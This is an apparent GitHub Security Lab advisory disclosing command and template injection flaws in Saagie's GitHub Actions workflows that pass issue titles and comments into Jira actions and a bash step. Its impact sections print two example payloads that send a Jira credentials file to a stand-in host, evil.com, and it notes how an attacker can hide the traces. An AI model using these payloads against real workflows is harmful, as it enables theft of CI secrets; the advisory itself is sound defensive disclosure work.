<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">February 3, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-206: Command and template injections in Saagie workflows</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/jarlob">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/26652396?s=35" height="35" width="35">
        <span>Jaroslav Lobacevski</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>

<ul>
  <li>10/29/2020: Report sent to vendor</li>
  <li>11/04/2020: Vendor acknowledges</li>
  <li>12/01/2020: Issue resolved in all affected repositories</li>
</ul>

<h2 id="summary">Summary</h2>

<p>GitHub workflows in <a href="https://github.com/saagie/technologies">saagie/technologies</a>, <a href="https://github.com/saagie/technologies-plugin">saagie/technologies-plugin</a> and <a href="https://github.com/saagie/sdk">saagie/sdk</a> repositories are vulnerable to arbitrary code execution from user comments.</p>

<h2 id="product">Product</h2>

<p><a href="https://github.com/saagie/technologies">saagie/technologies</a>, <a href="https://github.com/saagie/technologies-plugin">saagie/technologies-plugin</a> and <a href="https://github.com/saagie/sdk">saagie/sdk</a> repositories</p>

<h2 id="tested-version">Tested Version</h2>

<p>Master branch.</p>

<h2 id="details">Details</h2>

<h3 id="issue-1-hidden-expression-expansion-of-input-parameters-passed-to-atlassiangajira-create-or-atlassiangajira-comment">Issue 1: Hidden expression expansion of input parameters passed to <code class="language-plaintext highlighter-rouge">atlassian/gajira-create</code> or <code class="language-plaintext highlighter-rouge">atlassian/gajira-comment</code></h3>

<p><a href="https://github.com/saagie/technologies/blob/master/.github/workflows/comment_issue.yaml"><code class="language-plaintext highlighter-rouge">Jira Add comment on issue</code> step in comment_issue.yaml</a>, <a href="https://github.com/saagie/technologies/blob/master/.github/workflows/create_issue.yaml"><code class="language-plaintext highlighter-rouge">Jira Create issue</code> step in create_issue.yaml</a>, <a href="https://github.com/saagie/technologies-plugin/blob/master/.github/workflows/create_issue.yaml"><code class="language-plaintext highlighter-rouge">Jira Create issue</code> step in create_issue.yaml</a> and <a href="https://github.com/saagie/sdk/blob/master/.github/workflows/create_issue.yml"><code class="language-plaintext highlighter-rouge">Jira Create issue</code> step in create_issue.yaml</a> workflows are vulnerable to arbitrary code execution.</p>

<p><code class="language-plaintext highlighter-rouge">${{ github.event.issue.title }}</code>,<code class="language-plaintext highlighter-rouge">${{ github.event.issue.body }}</code> and <code class="language-plaintext highlighter-rouge">${{ github.event.comment.body }}</code> are used to format input values to <code class="language-plaintext highlighter-rouge">atlassian/gajira-create(comment)</code> actions. For example:</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">on</span><span class="pi">:</span>
    <span class="na">issue_comment</span><span class="pi">:</span>
        <span class="na">types</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">created</span><span class="pi">]</span>
<span class="nn">...</span>
<span class="na">uses</span><span class="pi">:</span> <span class="s">atlassian/gajira-comment@v2.0.0</span>
<span class="na">with</span><span class="pi">:</span>
    <span class="na">issue</span><span class="pi">:</span> <span class="s">${{ steps.extract_jira_number.outputs.jira_number }}</span>
    <span class="na">comment</span><span class="pi">:</span> <span class="pi">|</span>
        <span class="s">From : ${{ github.event.comment.user.login }}</span>
        <span class="s">Comment :</span>
        <span class="s">{quote}${{ github.event.comment.body }}{quote}</span>
</code></pre></div></div>

<p>However the Atlassian actions have a hidden feature - they expand <code class="language-plaintext highlighter-rouge">{{}}</code> internally. This way when the issue title or body contains an expression in double curly braces it is evaluated by node.js in these actions.</p>

<h4 id="impact">Impact</h4>

<p>This vulnerability allows for arbitrary code execution in the context of GitHub runner. For example a user may comment on an issue with:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{{ process.mainModule.require('child_process').exec(`curl -d @${process.env.HOME}/.jira.d/credentials http://evil.com`) }}
</code></pre></div></div>

<p>which will exfiltrate the secret Jira API token to the attacker controlled server. To make the attack less visible an attacker may modify the comment to <code class="language-plaintext highlighter-rouge">Never mind my bad</code>.</p>

<h3 id="issue-2-the-public-github-issue-title-is-used-to-format-a-shell-command">Issue 2: The public GitHub issue title is used to format a shell command</h3>

<p>When a user comments on a public issue it automatically starts the <a href="https://github.com/saagie/technologies/blob/master/.github/workflows/comment_issue.yaml">comment_issue.yaml</a> GitHub workflow. The title of the issue is used to format a bash script.</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">on</span><span class="pi">:</span>
    <span class="na">issue_comment</span><span class="pi">:</span>
        <span class="na">types</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">created</span><span class="pi">]</span>
<span class="nn">...</span>
<span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">Extract JIRA number</span>
  <span class="na">id</span><span class="pi">:</span> <span class="s">extract_jira_number</span>
  <span class="na">run</span><span class="pi">:</span> <span class="s">echo "::set-output name=jira_number::$(echo ${{ github.event.issue.title }}| sed 's/.*\[\(${{ secrets.JIRA_PROJECT }}-[[:digit:]]\{1,\}\)\].*/\1/')"</span>
</code></pre></div></div>

<h4 id="impact-1">Impact</h4>

<p>This vulnerability allows for arbitrary command injection into the bash script. For example a user may create an issue with a title <code class="language-plaintext highlighter-rouge">a)"; curl -d @$HOME/.jira.d/credentials http://evil.com #</code> which will exfiltrate the secret Jira API token to the attacker controlled server. To make the attack less visible the attacker may modify the issue title and close it.</p>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/JarLob">@JarLob (Jaroslav Lobačevski)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2020-206</code> in any communication regarding this issue.</p>

   